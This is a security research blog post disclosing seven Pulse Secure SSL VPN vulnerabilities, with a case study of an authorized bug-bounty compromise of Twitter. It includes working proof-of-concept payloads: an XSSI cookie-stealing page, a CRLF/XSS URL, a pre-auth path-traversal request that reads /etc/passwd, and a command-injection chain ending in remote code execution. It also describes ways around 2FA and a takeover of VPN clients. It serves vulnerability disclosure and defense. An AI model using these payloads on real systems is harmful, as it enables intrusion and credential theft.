  Composed of cybersecurity experts with the hacker mindset, exploring innovative exploitation techniques with high morality and extreme caution.](/en/company/our-team/)
  [## Achievements

  DEVCORE has been invited to leading cybersecurity conferences, has uncovered hundreds of critical product vulnerabilities, and helped enterprises improve their defensive capabilities.](/en/company/history/)
  [## Corporate Social Responsibility

  We provide diverse internship channels and programs to nurture the next generation and promote cybersecurity awareness.](/en/company/csr/)
  [## Job Opportunities

  Join us to secure the world and improve the cybersecurity industry together.](/en/company/jobs/)
* News
  [## BLOG

  Latest news](/en/blog/)
  [## Media Resources

  Media Kit, Logo and Usage Guideline](/en/media-kit/)
* [Search](/en/search/)
* [Contact](/en/contact/)

* Services
  [## Red Team Assessment](/en/services/red-team/)
  [## Penetration Testing](/en/services/penetration-test/)
  [## Security Consulting](/en/services/security-consulting/)
  [## Security Training](/en/services/security-training/)
* Research
  [## Overview](/en/research/overview/)
  [## Competitions and Awards](/en/research/awards/)
  [## Enterprise Vulnerability Reports](/en/research/bug-bounty/)
  [## International Conferences](/en/research/talks/)
  [## CVE List](/en/research/cve/)
* Company
  [## Company Overview](/en/company/about/)
  [## Team Members](/en/company/our-team/)
  [## Achievements](/en/company/history/)
  [## Corporate Social Responsibility](/en/company/csr/)
  [## Job Opportunities](/en/company/jobs/)
* News
  [## BLOG](/en/blog/)
  [## Media Resources](/en/media-kit/)
* [## Search](/en/search/)
  [## Contact](/en/contact/)
* Language
  [## 中文](/)
  [## English](/en)

# BLOG

* [All Articles](/en/blog/)
* [Tech Editorials](/en/blog/category/Tech%20Editorials/)
* [Media Resources](/en/media-kit/)

[Tech Editorials](/en/blog/category/Tech%20Editorials)
[#Advisory](/en/blog/tag/Advisory/) [#VPN](/en/blog/tag/VPN/) [#RCE](/en/blog/tag/RCE/)
# Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!

[Orange Tsai](/en/blog/author/orange)
2019-09-02

![](https://devco.re/assets/img/blog/20190902/cover.png)

---

Author: Orange Tsai([@orange\_8361](https://twitter.com/orange_8361)) and Meh Chang([@mehqq\_](https://twitter.com/mehqq_))

Hi, this is the last part of Attacking SSL VPN series. If you haven’t read previous articles yet, here are the quick links for you:

* [Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)
* [Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!](https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/)
* [Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN](https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/)

After we published our research at Black Hat, due to its great severity and huge impacts, it got lots of attention and discussions. Many people desire first-hand news and wonder when the exploit(especially the Pulse Secure preAuth one) will be released.

We also discussed this internally. Actually, we could simply drop the whole exploits without any concern and acquire plenty of media exposures. However, as a SECURITY firm, our responsibility is to make the world more secure. So we decided to postpone the public disclosure to give the world more time to apply the patches!

Unfortunately, the exploits were revealed by someone else. They can be easily found on GitHub[[1]](https://github.com/milo2012/CVE-2018-13379) [[2]](https://github.com/milo2012/CVE-2018-13382) [[3]](https://github.com/projectzeroindia/CVE-2019-11510) and exploit-db[[1]](https://www.exploit-db.com/exploits/47297). Honestly, we couldn’t say they are wrong, because the bugs are absolutely fixed several months ago, and they spent their time differing/reversing/reproducing. But it’s indeed a worth discussing question to the security community: if you have a nuclear level weapon, when is it ready for public disclosure?

We heard about more than 25 bug bounty programs are exploited. From the statistics of [Bad Packet](https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/), numerous Fortune 500, U.S. military, governments, financial institutions and universities are also affected by this. There are even [10 NASA servers exposed for this bug](https://twitter.com/sherlocksecure/status/1164492373591642112). So, these premature public disclosures indeed force these entities to upgrade their SSL VPN, this is the good part.

On the other hand, the bad part is that there is an increasing number of [botnets](https://www.securityweek.com/hackers-target-vulnerabilities-fortinet-pulse-secure-products) scanning the Internet in the meanwhile. An [intelligence](https://twitter.com/GossiTheDog/status/1167170305577689091) also points out that there is already a China APT group exploiting this bug. This is such an Internet disaster. Apparently, the world is not ready yet. So, if you haven’t updated your Palo Alto, Fortinet or Pulse Secure SSL VPN, please update it ASAP!

# About Pulse Secure

Pulse Secure is the market leader of SSL VPN which provides professional secure access solutions for Hybrid IT. Pulse Secure has been in our research queue for a long time because it was a [critical infrastructure of Google](https://archive.li/8pzwf), which is one of our long-term targets. However, Google applies the Zero Trust security model, and therefore the VPN is removed now.

![](/assets/img/blog/20190902/1.png)

We started to review Pulse Secure in mid-December last year. In the first 2 months, we got nothing. Pulse Secure has a good coding style and security awareness so that it’s hard to find trivial bugs. Here is an interesting comparison, we found the arbitrary file reading [CVE-2018-13379](https://fortiguard.com/psirt/FG-IR-18-384) on FortiGate SSL VPN on our first research day…

Pulse Secure is also a Perl lover, and writes lots of Perl extensions in C++. The interaction between Perl and C++ is also confusing to us, but we got more familiar with it while we paid more time digging in it. Finally, we got the first blood on **March 8, 2019**! It’s a stack-based overflow on the management interface! Although this bug isn’t that useful, our research progress got on track since that, and we uncovered more and more bugs.

We reported all of our finding to Pulse Secure PSIRT on **March 22, 2019**. Their response is very quick and they take these vulnerabilities seriously! After several conference calls with Pulse Secure, **they fixed all bugs just within a month**, and released the patches on **April 24, 2019**. You can check the detailed [security advisory](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/)!

It’s a great time to work with Pulse Secure. From our perspective, Pulse Secure is the most responsible vendor among all SSL VPN vendors we have reported bugs to!

# Vulnerabilities

We have found 7 vulnerabilities in total. Here is the list. We will introduce each one but focus on the CVE-2019-11510 and CVE-2019-11539 more.

* CVE-2019-11510 - Pre-auth Arbitrary File Reading
* CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow
* CVE-2019-11539 - Post-auth(admin) Command Injection
* CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS
* CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS
* CVE-2019-11540 - Post-auth Cross-Site Script Inclusion
* CVE-2019-11507 - Post-auth Cross-Site Scripting

## Affected versions

* Pulse Connect Secure 9.0R1 - 9.0R3.3
* Pulse Connect Secure 8.3R1 - 8.3R7
* Pulse Connect Secure 8.2R1 - 8.2R12
* Pulse Connect Secure 8.1R1 - 8.1R15
* Pulse Policy Secure 9.0R1 - 9.0R3.3
* Pulse Policy Secure 5.4R1 - 5.4R7
* Pulse Policy Secure 5.3R1 - 5.3R12
* Pulse Policy Secure 5.2R1 - 5.2R12
* Pulse Policy Secure 5.1R1 - 5.1R15

## CVE-2019-11540: Cross-Site Script Inclusion

The script `/dana/cs/cs.cgi` renders the session ID in JavaScript. As the content-type is set to `application/x-javascript`, we could perform the XSSI attack to steal the DSID cookie!

Even worse, the CSRF protection in Pulse Secure SSL VPN is based on the DSID. With this XSSI, we can bypass all the CSRF protection!

PoC:

```
<!-- http://attacker/malicious.html -->

<script src="https://sslvpn/dana/cs/cs.cgi?action=appletobj"></script>
<script>
    window.onload = function() {
        window.document.writeln = function (msg) {
            if (msg.indexOf("DSID") >= 0) alert(msg)
        }
        ReplaceContent()
    }
</script>

```
## CVE-2019-11507: Cross-Site Scripting

There is a CRLF Injection in `/dana/home/cts_get_ica.cgi`. Due to the injection, we can forge arbitrary HTTP headers and inject malicious HTML contents.

PoC:

```
https://sslvpn/dana/home/cts_get_ica.cgi
?bm_id=x
&vdi=1
&appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb<svg/onload=alert(document.domain)>

```
## CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS

The following two vulnerabilities (CVE-2019-11538 and CVE-2019-11508) do not affect default configurations. It appears only if the admin configures the NFS sharing for the VPN users.

If an attacker can control any files on remote NFS server, he can just create a symbolic link to any file, such as `/etc/passwd`, and read it from web interface. The root cause is that the implementation of NFS mounts the remote server as a real Linux directory, and the script `/dana/fb/nfs/nfb.cgi` does not check whether the accessed file is a symlink or not!

## CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS

This one is a little bit similar to the previous one, but with a different attack vector!

When the attacker uploads a ZIP file to the NFS through the web interface, the script `/dana/fb/nfs/nu.cgi` does not sanitize the filename in the ZIP. Therefore, an attacker can build a malicious ZIP file and traverse the path with `../` in the filename! Once Pulse Secure decompresses, the attacker can upload whatever he wants to whatever path!

## CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow

There is a stack-based buffer overflow in the following Perl module implementations:

* DSHC::ConsiderForReporting
* DSHC::isSendReasonStringEnabled
* DSHC::getRemedCustomInstructions

These implementations use `sprintf` to concatenate strings without any length check, which leads to the buffer overflow. The bug can be triggered in many places, but here we use `/dana-admin/auth/hc.cgi` as our PoC.

```
https://sslvpn/dana-admin/auth/hc.cgi
?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&policyid=0

```

And you can observed the segment fault from `dmesg`

```
cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]

```
## CVE-2019-11510: Pre-auth Arbitrary File Reading

Actually, this is the most severe bug in this time. It is in the web server implementation. As our slides mentioned, Pulse Secure implements their own web server and architecture stack from scratch. The original path validation is very strict. However, since version 8.2, Pulse Secure introduced a new feature called `HTML5 Access`, it’s a feature used to interact with Telnet, SSH, and RDP by browsers. Thanks to this new feature, the original path validation becomes loose.

In order to handle the static resources, Pulse Secure created a new IF-CONDITION to widen the originally strict path validation. The code wrongly uses the `request->uri` and `request->filepath`, so that we can specify the `/dana/html5acc/guacamole/` in the end of the query string to bypass the validation and make `request->filepath` to any file you want to download!

And it’s worth to mention that in order to read arbitrary files, you must to specify the `/dana/html5acc/guacamole/` in the middle of the path again. Otherwise, you can only download limited file extensions such as .json, .xml or .html.

Due to the exploit is in the wild, there is no longer any concern to show the payload:

```
import requests

r = requests.get('https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/')
print r.content

```

![](/assets/img/blog/20190902/2.png)

## CVE-2019-11539: Post-auth(admin) Command Injection

The last one is a command injection on the management interface. We found this vulnerability very early, but could not find a way to exploit it at first. While we were in Vegas, one of my friends told me that he found the same bug before, but he didn’t find a way to exploit it, so he didn’t report to the vendor.

However, we did it, and we exploit it in a very smart way :)

The root cause of this vulnerability is very simple. Here is a code fragment of `/dana-admin/diag/diag.cgi`:

```
# ...
$options = tcpdump_options_syntax_check(CGI::param("options"));

# ...
sub tcpdump_options_syntax_check {
  my $options = shift;
  return $options if system("$TCPDUMP_COMMAND -d $options >/dev/null 2>&1") == 0;
  return undef;
}

```

It’s so obvious and straightforward that everyone can point out there is a command injection at the parameter `options`! However, is it that easy? No!

In order to avoid potential vulnerabilities, Pulse Secure applies lots of hardenings on their products! Such as the system integrity check, read-only filesystem and a module to hook all dangerous Perl invocations like `system`, `open` and `backtick`…

This module is called `DSSAFE.pm`. It implements its own command line parser and re-implements the I/O redirections in Perl. Here is [the code fragments on Gist](https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147).

From the code fragments, you can see it replaces the original `system` and do lots of checks in `__parsecmd`. It also blocks numerous bad characters such as:

```
[\&\*\(\)\{\}\[\]\`\;\|\?\n~<>]

```

The checks are very strict so that we can not perform any command injection. We imagined several ways to bypass that, and the first thing came out of my mind is the argument injection. We listed all arguments that `TCPDUMP` supports and found that the `-z postrotate-command` may be useful. But the sad thing is that the `TCPDUMP` in Pulse Secure is too old(v3.9.4, Sept 2005) to support this juicy feature, so we failed :(

While examining the system, we found that although the webroot is read-only, we can still abuse the cache mechanism. Pulse Secure caches the template result in `/data/runtime/tmp/tt/` to speed up script rendering. So our next attempt is to write a file into the template cache directory via `-w write-file` argument. However, it seems impossible to write a polyglot file in both PCAP and Perl format.

As it seems we had reached the end of argument injection, we tried to dig deeper into the `DSSFAFE.pm` implementation to see if there is anything we can leverage. Here we found a defect in the command line parser. If we insert an incomplete I/O redirection, the rest of the redirection part will be truncated. Although this is a tiny flaw, it helped us to re-control the I/O redirections! However, the problem that we can’t generate a valid Perl script still bothered us.

We got stuck here, and it’s time to think out of the box. It’s hard to generate a valid Perl script via `STDOUT`, could we just write the Perl by `STDERR`? The answer is yes. When we force the `TCPDUMP` to read a nonexistent-file via `-r read-file`. It shows the error:

> tcpdump: [filename]: No such file or directory

It seems we can “**partially**” control the error message. Then we tried the filename `print 123#`, and the magic happens!

```
$ tcpdump -d -r 'print 123#'
  tcpdump: print 123#: No such file or directory

$ tcpdump -d -r 'print 123#' 2>&1 | perl –
  123

```

The error message becomes a valid Perl script now. Why? OK, let’s have a Perl 101 lesson now!

![](/assets/img/blog/20190902/3.png)

As you can see, Perl supports the GOTO label, so the `tcpdump:`  becomes a valid label in Perl. Then, we comment the rest with a hashtag. With this creative trick, we can generate any valid Perl now!

Finally, we use an incomplete I/O symbol `<` to fool the `DSSAFE.pm` command parser and redirect the `STDERR` into the cache directory! Here is the final exploit:

```
-r$x="ls /",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc <

```

The concatenated command looks like:

```
/usr/sbin/tcpdump -d
 -r'$x="ls /",system$x#'
 2>/data/runtime/tmp/tt/setcookie.thtml.ttc <
 >/dev/null
 2>&1

```

And the generated `setcookie.thtml.ttc` looks like:

```
 tcpdump: $x="ls /",system$x#: No such file or directory

```

Once we have done this, we can just fetch the corresponding page to execute our command:

```
$ curl https://sslvpn/dana-na/auth/setcookie.cgi
 boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
 data  etc  lib   lost+found  modules  pkg  sbin  tmp
 ...

```

So far, the whole technical part of this command injection is over. However, we think there may be another creative way to exploit this, if you found one, please tell me!

# The Case Study

After Pulse Secure patched all the bugs on **April 24, 2019**. We kept monitoring the Internet to measure the response time of each large corporation. Twitter is one of them. They are known for their [bug bounty program](https://hackerone.com/twitter) and nice to hackers. However, it’s improper to exploit a 1-day right after the patch released. So we wait 30 days for Twitter to upgrade their SSL VPN.

![](/assets/img/blog/20190902/4.png)

We have to say, we were nervous during that time. The first thing we did every morning is to check whether Twitter upgrades their SSL VPN or not! It was an unforgettable time for us :P

We started to hack Twitter on **May 28, 2019**. During this operation, we encounter several obstacles. The first one is, although we can obtain the plaintext password of Twitter staffs, we still can’t log into their SSL VPN because of the Two Factor Authentication. Here we suggest two ways to bypass that. The first one is that we observed Twitter uses the solution from [Duo](https://duo.com). The [manual](https://duo.com/docs/pulseconnect) mentions:

> The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Don’t share it with unauthorized individuals or email it to anyone under any circumstances!

So if we can extract the secret key from the system, we can leverage the Duo API to bypass the 2FA. However, we found a quicker way to bypass it. Twitter enabled the [Roaming Session](https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB30329) feature, which is used to enhances mobility and allows a session from multiple IP locations.

Due to this “**convenient**” feature, we can just download the session database and forge our cookies to log into their system!

![](/assets/img/blog/20190902/5.png)

Until now, we are able to access Twitter Intranet. Nevertheless, our goal is to achieve code execution! It sounds more critical than just accessing the Intranet. So we would like to chain our command injection bug(CVE-2019-11539) together. OK, here, we encountered another obstacle. It’s the restricted management interface!

As we mentioned before, our bug is on the management interface. But for the security consideration, most of the corporation disable this interface on public, so we need another way to access the admin page. If you have read our previous article carefully, you may recall the “**WebVPN**” feature! WebVPN is a proxy which helps to connect to anywhere. So, let’s connect to itself.

Yes, it’s SSRF!

Here we use a small trick to bypass the SSRF protections.

![](/assets/img/blog/20190902/6.png)

Ahha! Through our SSRF, we can touch the interface now! Then, the last obstacle popped up. We didn’t have any plaintext password of managers. When Perl wants to exchange data with native procedures, such as the Perl extension in C++ or web server, it uses the cache to store data. The problem is, Pulse Secure forgets to clear the sensitive data after exchange, so that’s why we can obtain plaintext passwords in the cache. But practically, most of the managers only log into their system for the first time, so it’s hard to get the manager’s plaintext password. The only thing we got, is the password hash in `sha256(md5_crypt(salt, …))` format…

If you are experienced in cracking hashes, you will know how hard it is. So…

We launched a 72 core AWS to crack that.

![](/assets/img/blog/20190902/7.png)

We cracked the hash and got the RCE successfully! I think we are lucky because from our observation, there is a very strong password policy on Twitter staffs. But it seems the policy is not applied to the manager. The manager’s password length is only ten, and the first character is **B**. It’s at a very early stage of our cracking queue so that we can crack the hash in 3 hours.

We reported all of our findings to Twitter and got the highest bounty from them. Although we can not prove that, it seems this is the first remote code execution on Twitter! If you are interested in the full report, you can check the [HackerOne link](https://hackerone.com/reports/591295) for more details.

# Recommendations

How to mitigate such attacks? Here we give several recommendations.

The first is the Client-Side Certificate. It’s also the most effective method. Without a valid certificate, the malicious connection will be dropped during SSL negotiation! The second is the Multi-factor Authentication. Although we break the Twitter 2FA this time, with a proper setting, the MFA can still decrease numerous attack surface. Next, enable the full log audit and remember to send to an out-bound log server.

Also, perform your corporate asset inventory regularly and subscribe to the vendor’s security advisory. The most important of all, always keep your system updated!

# Bonus: Take over all the VPN clients

Our company, [DEVCORE](https://devco.re/), provides the most professional red team service in Asia. In this bonus part, let’s talk about how to make the red team more **RED**!

We always know that in a red team operation, the personal computer is more valuable! There are several old-school methods to compromise the VPN clients through SSL VPN before, such as the water-hole attack and replacing the VPN agent.

During our research, we found a new attack vector to take over all the clients. It’s the “**logon script**” feature. It appears in almost EVERY SSL VPNs, such as OpenVPN, Fortinet, Pulse Secure… and more. It can execute corresponding scripts to mount the network file-system or change the routing table once the VPN connection established.

Due to this “**hacker-friendly**” feature, once we got the admin privilege, we can leverage this feature to infect all the VPN clients! Here we use the Pulse Secure as an example, and demonstrate how to not only compromise the SSL VPN but also take over all of your connected clients:

# Epilogue

OK, here is the end of this Attacking SSL VPN series! From our findings, SSL VPN is such a huge attack surface with few security researchers digging into. Apparently, it deserves more attention. We hope this kind of series can encourage other researchers to engage in this field and enhance the security of enterprises!

Thanks to all guys we met, co-worked and cooperated. We will publish more innovative researches in the future :)

[### Orange Tsai](/en/blog/author/orange)
Principal Security Researcher

I am Orange : )

[![](/images/logo.svg)](/en/)

###### Services

* [Red Team Assessment](/en/services/red-team/)
* [Penetration Testing](/en/services/penetration-test/)
* [Security Consulting](/en/services/security-consulting/)
* [Security Training](/en/services/security-training/)

###### Research

* [Overview](/en/research/overview/)
* [Competitions and Awards](/en/research/awards/)
* [Enterprise Vulnerability Reports](/en/research/bug-bounty/)
* [International Conferences](/en/research/talks/)
* [CVE List](/en/research/cve/)

###### Company

* [Company Overview](/en/company/about/)
* [Team Members](/en/company/our-team/)
* [Achievements](/en/company/history/)
* [Corporate Social Responsibility](/en/company/csr/)
* [Job Opportunities](/en/company/jobs/)
* [Contact](/en/contact/)

###### News

* [Blog](/en/blog/)
* [Media Resources](/en/media-kit/)

© 2025 DEVCORE **All rights reserved.**
[Privacy Policy](/en/privacy-policy/)

Language :[中文](/)|[English](/en/)


